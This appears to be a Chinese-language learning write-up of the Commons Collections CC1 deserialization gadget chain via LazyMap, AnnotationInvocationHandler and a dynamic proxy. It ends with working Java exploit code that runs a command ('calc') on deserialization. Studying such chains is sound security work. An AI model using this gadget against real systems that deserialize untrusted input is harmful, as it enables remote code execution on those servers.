CC1有两条链

在之前使用的是TransformedMap

还有一条LazyMap链
<img width="934" height="574" alt="image" src="https://github.com/user-attachments/assets/0a4be022-4c68-41d4-aea1-d7c182a855e2" />

在LazyMap中的 get()方法也调用了transform

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/f9a6e50f-057c-4c53-a74b-314019b32ec5" />

如果map.containsKey(key) == false

那就调用factory.transform(key)

LazyMap方法是protected，

<img width="637" height="49" alt="image" src="https://github.com/user-attachments/assets/7c56740e-2f2c-479d-b68c-8fbfa56013dc" />

<img width="1171" height="769" alt="image" src="https://github.com/user-attachments/assets/988cb7d8-e45b-40b0-96b3-1eedf3b02673" />

但是LazyMap提供了静态方法decorate可以获取实例对象

<img width="1003" height="535" alt="image" src="https://github.com/user-attachments/assets/29c35f4f-4a1e-42c1-96d4-8296927b5882" />

现在搜索用法，查找谁调用了get()方法

这里查找出来非常多

直接来到AnnotationInvocationHandler

最后是在这个类的 invoke方法中有调用

<img width="1854" height="1470" alt="image" src="https://github.com/user-attachments/assets/25de4b64-57c0-4b4b-b145-94aaaef26817" />

这是一个动态代理类，如果调用动态代理类的任意方法，那么就会调用这个动态代理类的invoke方法

Payload构造：

创建LazyMap

上面有提到，LazyMap是protected的，只能用decorate来调用

<img width="2013" height="399" alt="image" src="https://github.com/user-attachments/assets/87fa88bf-a750-47e2-baca-cee6b220f4b9" />

方法中接受两个参数，一个map，factory

factory参数就直接传递之前构造好的chainedTransformer

现在已经将chainedTransformer嵌入到LazyMap中了

下一步就是要通过lazyMap.get()方法来触发

在AnnotationInvocationHandler中的invoke方法调用了get()方法

<img width="1632" height="775" alt="image" src="https://github.com/user-attachments/assets/1e207d4f-e1fc-480f-a6d3-35cd887d6350" />

在这里是通过memberValues来调用的get()方法.
意思就是，现在需要让前面构造好的lazyMap是这个memberValues.

这样才能调用到这个get方法

那这个memberValues怎么构造？

<img width="1503" height="330" alt="image" src="https://github.com/user-attachments/assets/0af89ef6-5ece-44c3-a103-e9fc2cdbd8a5" />

查看构造器发现，这个memberValues是可以自己设置的

Payload构造：

反射获取AnnotationInvocationHandler类

<img width="1839" height="589" alt="image" src="https://github.com/user-attachments/assets/457e35fe-3c26-4697-8347-ae1bb4c5574b" />

最后一行第二个参数传入之前构造的lazyMap,
现在这个lazyMap就等同于memberValues了,
现在已经构造好LazyMap中的get方法了,

下一步就是如何去触发这个get方法

在上面说到过，是在invoke方法中触发的memberValues.get(),
而且这个AnnotationInvocationHandler类是一个动态代理处理器类,
如果要调用这个invoke方法，只需要调用任意方法就会执行这个invoke方法,
但是需要借助动态代理来调用，

创建动态代理

<img width="1936" height="684" alt="image" src="https://github.com/user-attachments/assets/33bf282b-a018-4784-aede-1e543ec153da" />

第一个参数是ClassLoader 调用LazyMap中的ClassLoader,
第二个参数是一个Class数组 传入Map.class,
第三个参数，传入前面构造好的o对象,

最后一步就来到了readObject方法中

<img width="1648" height="1002" alt="image" src="https://github.com/user-attachments/assets/011944c0-6539-4f60-9dc3-79d77f17e39f" />

当我们传递将LazyMap为memberValues,
就会调用LazyMap.entrySet(),
在前面的代码中，我们对Map做了动态代理,
只要传递的是Map，那么就会进入到这个类的invoke方法,

<img width="1885" height="780" alt="image" src="https://github.com/user-attachments/assets/25fdd832-1f2c-42cc-8bb0-80ff4b67a190" />


        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap();
        Map<Object, Object> lazyMap = LazyMap.decorate(map, chainedTransformer);


        Class aClass = forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        InvocationHandler o = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class, lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, o);

        Object o1 = annotationInvocationHandlerConstructor.newInstance(Override.class, proxyMap);
        serialize(o1);
        unserialize("ser.bin");

        serialize(o);
        unserialize("ser.bin");


    }


    public static void serialize(Object object) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(object);
    }

    //反序列化方法
    public static void unserialize(String filename) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));
        objectInputStream.readObject();
    }
    }

参考链接：
https://blog.csdn.net/qq_45305211/article/details/142407613
https://www.bilibili.com/video/BV1yP4y1p7N7
